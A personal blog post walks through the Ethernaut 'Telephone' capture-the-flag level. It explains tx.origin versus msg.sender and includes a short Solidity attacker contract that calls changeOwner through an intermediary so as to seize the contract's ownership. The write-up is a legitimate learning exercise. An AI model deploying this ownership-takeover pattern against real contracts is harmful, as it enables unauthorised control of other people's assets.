# Ethernaut Challenge Level 4

# Introduction

Hey there, welcome back everyone. This is me writing the next article in my series [Ethernaut Journey](https://atoo.hashnode.dev/series/ethernaut-journey). I successfully solved yet another challenge and claimed ownership of the contract. (Brilliant hacker feels!!!)

> *NOTE:* *You don't need to read through the entire article if you are looking for some solution to your problem. Head down to the challenges section and see if I encountered the same challenge as you.*

# Let's Start

As always, as soon as I read the words "claim ownership", I start looking for places where the property `owner` is assigned a new value. This time I found it in the `changeOwner` function which very happily accepted a new owner address in the params and updated the owner if `tx.origin` does not match with `msg.sender`.

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
```

This exploit tested my understanding of how the blockchain in itself works and what even do they mean by `tx.origin`. So basically, this property denotes the address of the transaction from where it originated in the first place. What I mean it, transactions can be generated by user accounts like us or even smart contracts.

This is the defining part of understanding how the value of `msg.sender` and `tx.origin` might defer concerning the situation. When you normally interact with some smart contract via your browser and metamask extension, both the values stay the same as the origination of the transaction are you and so is the sender.

Now, where this might not be the same as in the case of you calling a smart contract and the contract calling another smart contract. Here, `tx.origin` is your address and `msg.sender` is the address of the callee smart contract.

There I have it, this is exactly what I need to be able to set the owner to myself as both these values would be different. I quickly opened up [Remix IDE](https://remix.ethereum.org/) and coded the below smart contract.

```solidity
//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.7;

interface Telephone{
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    Telephone telephone;

    constructor (address _addr){
        telephone = Telephone(_addr);
    } 

    function callChangeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
```

The main function here is the `callChangeOwner` function which obviously simply calls the `changeOwner` function of the main `Telephone` contract. Once the transaction was successfully minted, I submitted the instance and bammm, I was the new owner!!

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1673776896331/3e193fae-8dd9-4e4f-89bf-1c8b907872ab.png align="center")

# Challenges

1. How to make `tx.origin` and `msg.sender` have different values?
    
    Solution: Simply write another smart contract and call the required function from the newly written smart contract. In our case the function called was `changeOwner`.
    

# **Support**

If you liked my article, consider supporting me with a coffee ☕️ or some crypto ( ₿, ⟠, etc)

Here is my public address `0x7935468Da117590bA75d8EfD180cC5594aeC1582`

[![Buy Me A Coffee](https://cdn.buymeacoffee.com/buttons/default-yellow.png align="left")](https://www.buymeacoffee.com/atoo)

### Let's connect

[**GitHub**](https://github.com/Atoo35)

[**LinkedIn**](https://www.linkedin.com/in/atharva-deshpande-187969140/)

[**Twitter**](https://twitter.com/atharva_35)

### Feedback

Let me know if I have missed something or provided the wrong info. It helps me keep genuine content and learn.